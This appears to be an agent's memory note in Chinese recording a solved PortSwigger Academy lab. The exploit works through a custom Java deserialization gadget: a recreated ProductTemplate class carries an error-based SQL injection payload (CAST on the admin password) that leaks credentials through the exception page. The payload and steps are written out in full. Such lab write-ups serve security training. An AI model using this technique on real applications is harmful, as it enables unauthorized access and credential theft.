---
metadata:
  node_type: memory
name: "PRS arm A lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization"
description: "arm A 基线:lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization 冷实例一次通过 - ProductTemplate.readObject 的 SQLi + 500 页异常回显(CAST 报错)外传 admin 口令,登录后删 carlos"
last_updated: 2026-10-09T10:30:33+08:00
created: 2026-10-09T10:30:33+08:00
---

## 终态: solved (banner "Congratulations, you solved the lab!")

**Instance**: range_launch launch-url canonical academy path，reused:false → 0af800280336e38480dc0d3800e10068.web-security-academy.net（jar /tmp/cj1.json）

**侦察腿**
1. 首页 HTML 注释泄 `<!-- <a href=/backup/AccessTokenUser.java>Example user</a> -->`；`/backup/` 目录列表给两件源码：`AccessTokenUser.java`、`ProductTemplate.java`。
2. `AccessTokenUser` = 会话对象（`lab.actions.common.serializable.AccessTokenUser`，字段 accessToken + username）；登录 wiener:peter 后 session cookie 就是它的 Java 序列化 base64。
3. `ProductTemplate.readObject` 反序列化即执行 `SELECT * FROM products WHERE id = '<id>' LIMIT 1`（`id` 是唯一非 transient 字段，`serialVersionUID = 1L`）⇒ 自定义 gadget 点。

**利用腿（自定义链 + 报错回显外传）**
4. 本地用 javac 复刻同名类 `data/productcatalog/ProductTemplate`（同 FQN + 同一 serialVersionUID=1L + 同字段 id），序列化 `new ProductTemplate(<注入串>)` 当 session cookie 投递（java_ser 件编译+发 jar，自动处理 base64 的 URL 编码）。
5. 先证 gadget 触发：id=`PROD1` ⇒ 500 页回显 `java.lang.ClassCastException: Cannot cast data.productcatalog.ProductTemplate to lab.actions.common.serializable.AccessTokenUser`（readObject 已跑完，才轮到转型）。异常页把 `e.toString()` 落进 `<p class=is-warning>`。
6. 外传信道 = 上述异常回显：`readObject` 里 `throw new IOException(e)` 把 PSQLException 带出来。载荷 id：
   `' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS int)-- `
   ⇒ 500 页 `java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: "gxtkt1at7zrthch9oiz4"`。
7. 取口令后 administrator 登录 → `GET /admin/delete?username=carlos` → 302 `/admin` → banner is-solved。

**要点/坑**
- 本题输出腿不需要 UNION/盲注/OOB：应用把反序列化异常串直接印在 500 页，CAST 报错即数据信道。
- 复刻类只需 FQN + 显式 serialVersionUID + 字段名匹配；readObject 本体不必本地实现（服务端用自己的类）。
- cookie 值走 URL 编码（服务端自身返回的是 `%3d` 形），base64 里的 `+ / =` 必须转义——用件的 `--jar` 写 jar 最稳。

